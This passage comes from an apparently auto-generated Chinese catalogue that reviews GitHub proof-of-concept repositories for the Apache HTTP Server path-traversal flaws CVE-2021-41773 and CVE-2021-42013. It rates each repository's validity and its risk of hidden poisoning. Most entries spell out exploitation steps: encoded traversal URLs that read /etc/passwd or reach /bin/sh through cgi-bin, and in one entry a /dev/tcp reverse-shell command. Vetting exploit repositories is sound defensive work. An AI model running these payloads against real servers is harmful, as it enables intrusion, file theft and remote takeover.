CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
